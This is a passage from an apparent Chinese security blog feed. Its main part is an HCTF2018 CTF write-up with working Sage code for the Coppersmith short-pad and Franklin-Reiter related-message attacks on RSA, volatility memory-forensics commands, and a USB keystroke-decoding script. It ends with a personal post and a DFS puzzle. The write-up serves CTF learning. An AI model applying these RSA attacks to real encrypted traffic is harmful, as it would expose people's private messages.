punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor >= n^0.5</span>    <span class="token keyword">return</span> diff<span class="token keyword">def</span> <span class="token function">related_message_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>diff<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n<span class="token operator">=</span> <span class="token number">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span>    c1<span class="token operator">=</span> <span class="token number">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span>    c2<span class="token operator">=</span> <span class="token number">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span>    e <span class="token operator">=</span> <span class="token number">5</span>    diff <span class="token operator">=</span> short_pad_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"difference of two messages is %d"</span> <span class="token operator">%</span> diff    m1 <span class="token operator">=</span> related_message_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m2 <span class="token operator">=</span> m1 <span class="token operator">+</span> diff    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m2    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c2</code></pre><p>sage环境可以自己安装，也可以在线运行：<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote><p>这几道misc感觉也姿势满满呢。比如内存取证，usb流量分析。</p></blockquote><h3 id="eazy-dump"><a href="#eazy-dump" class="headerlink" title="eazy_dump"></a>eazy_dump</h3><p>首先需要知道这是一个镜像文件，而kali下面的volatility可以进行内存取证，可以参考这一篇文章：<a href="https://www.jianshu.com/p/6438bc3302c8" target="_blank" rel="noopener">CTF内存取证</a></p><p>执行命令<code>volatility -f mem.data imageinfo</code>可以看到镜像信息：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205904.png" alt=""></p><p><code>volatility -f mem.data --profile=Win2008R2SP0x64 pslist</code>查看进程：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113210854.png" alt=""></p><p><code>**volatility -f mem.data --profile=Win2008R2SP0x64 -p [PID] -D [dump 出的文件保存的目录]**</code>导出指定进程数据：</p><p>gimp可以读取.data文件，从原始数据中载入图像（需要注意调整的是宽度，这个最重要，当宽度为1457时最接近原图，然后越大就越不容易找到）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113214227.png" alt=""></p><h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>通过提取并且解密usb流量可以得到一段 malbolge 的代码，之前在中科大校赛上面也做过😄。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205419.png" alt=""></p><p>然后可以google上面搜个编译器运行一下，不同的编译器效果可能不一样，有可能这个编译器有用，另外一个没用。。</p><p>usbdecode.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#linux python2</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> osDataFileName <span class="token operator">=</span> <span class="token string">"usb.dat"</span>presses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># check argv</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get argv</span>    pcapFilePath <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># get data of pcap</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"tshark -r %s -T fields -e usb.capdata > %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pcapFilePath<span class="token punctuation">,</span> DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># read data</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>DataFileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            presses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># handle</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> press <span class="token keyword">in</span> presses<span class="token punctuation">:</span>        Bytes <span class="token operator">=</span> press<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> normalKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"02"</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># shift key is pressed.</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"01"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">"Ctrl+"</span> <span class="token operator">+</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[-] Unknow Key : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Found : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># clean the temp data</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm ./%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>待更新。。。。。。。。。。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;HCTF2018-学习记录&quot;&gt;&lt;a href=&quot;#HCTF2018-学习记录&quot; class=&quot;headerlink&quot; title=&quot;HCTF2018_学习记录&quot;&gt;&lt;/a&gt;HCTF2018_学习记录&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="信息安全" scheme="http://www.yof3ng.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>我是一个菜鸡</title>
    <link href="http://www.yof3ng.xyz/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/"/>
    <id>http://www.yof3ng.xyz/2018/11/11/我是一个菜鸡/</id>
    <published>2018-11-11T13:50:58.000Z</published>
    <updated>2018-11-11T13:53:04.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="菜鸡"><a href="#菜鸡" class="headerlink" title="菜鸡"></a>菜鸡</h1><p>你怎么这么菜啊！鸽了五天了！要做颓废菜鸡了吗😭！你又low又菜还不努力，又想随波逐流（咸鱼真香😄）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;菜鸡&quot;&gt;&lt;a href=&quot;#菜鸡&quot; class=&quot;headerlink&quot; title=&quot;菜鸡&quot;&gt;&lt;/a&gt;菜鸡&lt;/h1&gt;&lt;p&gt;你怎么这么菜啊！鸽了五天了！要做颓废菜鸡了吗😭！你又low又菜还不努力，又想随波逐流（咸鱼真香😄）。&lt;/p&gt;

      
    
    </summary>
    
      <category term="杂文" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="我是菜鸡" scheme="http://www.yof3ng.xyz/tags/%E6%88%91%E6%98%AF%E8%8F%9C%E9%B8%A1/"/>
    
  </entry>
  
  <entry>
    <title>DFS深搜_Oil_Deposits</title>
    <link href="http://www.yof3ng.xyz/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/"/>
    <id>http://www.yof3ng.xyz/2018/11/07/DFS深搜-Oil-Deposits/</id>
    <published>2018-11-07T14:26:26.000Z</published>
    <updated>2018-11-07T14:44:06.061Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="一个DFS水题（对我来说不水）"><a href="#一个DFS水题（对我来说不水）" class="headerlink" title="一个DFS水题（对我来说不水）"></a>一个DFS水题（对我来说不水）</h1><h2 id="Oil-Deposits"><a href="#Oil-Deposits" class="headerlink" title="Oil Deposits"></a>Oil Deposits</h2><pre class=" language-c++"><code class="language-c++">The GeoSurvComp geologic survey company is responsible for detecting underground oil deposits.GeoSurvComp works with one large rectangular region of land at a time, and creates a grid that dividesthe land into numerous square plots. It then analyzes each plot separately, using sensing equipment todetermine whether or not the plot contains oil.A plot containing oil is called a pocket. If two pockets are adjacent, then they are part of thesame oil deposit. Oil deposits can be quite large and may contain numerous pockets. Your job is todetermine how many different oil deposits are contained in a grid.InputThe input file contains one or more grids. Each grid begins with a line containing m and n, the numberof rows and columns in the grid, separated by a single space. If m = 0 it signals the end of the input;otherwise 1 ≤ m ≤ 100 and 1 ≤ n ≤ 100. Following this are m lines of n characters each (not countingthe end-of-line characters). Each character corresponds to one plot, and is either ‘*’, representing theabsence of oil, or ‘@’, representing an oil pocket.OutputFor each grid, output the number of distinct oil deposits. Two different pockets are part of the sameoil deposit if they are adjacent horizontally, vertically, or diagonally. An oil deposit will not containmore than 100 pockets.</code></pre><p>sample input:</p><pre class=" language-c++"><code class="language-c++">1 1*3 5*@*@***@***@*@*1 8@@****@*5 5 ****@*@@*@*@**@@@@*@@@**@0 0</code></pre><p>sample output:</p><pre class=" language-c++"><code class="language-c++">0122</code></pre><p>引用一下百度百科：</p><blockquote><p>这题考察的是DFS(Depth First Search)：</p><p>深度优先搜索是一种在开发爬虫早期使用较多的方法。它的目的是要达到被搜索结构的叶结点(即那些不包含任何<a 